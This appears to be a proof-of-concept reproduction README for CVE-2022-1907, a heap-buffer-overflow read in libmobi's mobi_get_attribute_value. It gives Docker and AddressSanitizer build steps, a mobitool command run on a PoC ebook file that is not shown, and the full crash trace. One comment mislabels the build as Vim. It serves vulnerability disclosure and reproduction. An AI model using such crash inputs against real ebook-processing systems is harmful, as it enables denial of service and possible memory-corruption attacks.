### CVE-2022-1907

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/4eb0fa3e-4480-4fb5-8ec0-fbcd71de6012/)

### Docker Container Run Command
```shell
docker build -t cve-2022-1907-poc .
docker run -itd --name CVE-2022-1907-POC cve-2022-1907-poc
docker exec -it CVE-2022-1907-POC /bin/bash
```

### PoC Reproduce Command
```shell
cd /poc
# Preparing the initial environment
apt-get update -y
apt install wget gcc make libtool-bin build-essential llvm-dev libunwind-dev cmake zlib1g-dev libboost-all-dev -y

wget https://github.com/bfabiszewski/libmobi/archive/refs/tags/v0.10.tar.gz
tar -zxvf v0.10.tar.gz
cd libmobi-0.10/

# Configure, compile, and install Vim.
export CC=gcc CXX=g++ CFLAGS="-fsanitize=address -static-libasan" CXXFLAGS="-fsanitize=address -static-libasan" LDFLAGS="-fsanitize=address -static-libasan"
./autogen.sh &&  ./configure && make
make install
ldconfig

# Open the poc file.
mkdir tmp
mobitool -e -o ./tmp/ /poc/poc4
```

### Description
Observed that:
```shell
Title: libmobi_ncx_test
__
Mobi version: 1

Reconstructing source resources...
=================================================================
==9367==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffaf70301f at pc 0xffffb686fb4c bp 0xfffff1408410 sp 0xfffff1408420
READ of size 1 at 0xffffaf70301f thread T0
#0 0xffffb686fb48 in mobi_get_attribute_value (/usr/local/lib/libmobi.so.0+0x1fb48)
#1 0xffffb687393c in mobi_get_filepos_array (/usr/local/lib/libmobi.so.0+0x2393c)
#2 0xffffb6877b90 in mobi_reconstruct_links_kf7 (/usr/local/lib/libmobi.so.0+0x27b90)
#3 0xffffb6878af4 in mobi_reconstruct_links (/usr/local/lib/libmobi.so.0+0x28af4)
#4 0xffffb687a400 in mobi_parse_rawml_opt (/usr/local/lib/libmobi.so.0+0x2a400)
#5 0xffffb6879940 in mobi_parse_rawml (/usr/local/lib/libmobi.so.0+0x29940)
#6 0xaaaaba92d8d4 in loadfilename (/usr/local/bin/mobitool+0xe88d4)
#7 0xaaaaba92e9a8 in main (/usr/local/bin/mobitool+0xe99a8)
#8 0xffffb65f73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#9 0xffffb65f74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#10 0xaaaaba85e1ec in _start (/usr/local/bin/mobitool+0x191ec)

0xffffaf70301f is located 0 bytes to the right of 1439-byte region [0xffffaf702a80,0xffffaf70301f)
allocated by thread T0 here:
#0 0xaaaaba8e0f64 in malloc (/usr/local/bin/mobitool+0x9bf64)
#1 0xffffb687235c in mobi_reconstruct_parts (/usr/local/lib/libmobi.so.0+0x2235c)
#2 0xffffb687a3b0 in mobi_parse_rawml_opt (/usr/local/lib/libmobi.so.0+0x2a3b0)
#3 0xffffb6879940 in mobi_parse_rawml (/usr/local/lib/libmobi.so.0+0x29940)
#4 0xaaaaba92d8d4 in loadfilename (/usr/local/bin/mobitool+0xe88d4)
#5 0xaaaaba92e9a8 in main (/usr/local/bin/mobitool+0xe99a8)
#6 0xffffb65f73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#7 0xffffb65f74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#8 0xaaaaba85e1ec in _start (/usr/local/bin/mobitool+0x191ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/lib/libmobi.so.0+0x1fb48) in mobi_get_attribute_value
Shadow bytes around the buggy address:
0x200ff5ee05b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee05c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee05d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee05e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee05f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff5ee0600: 00 00 00[07]fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5ee0610: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5ee0620: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5ee0630: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee0640: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5ee0650: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9367==ABORTING
```



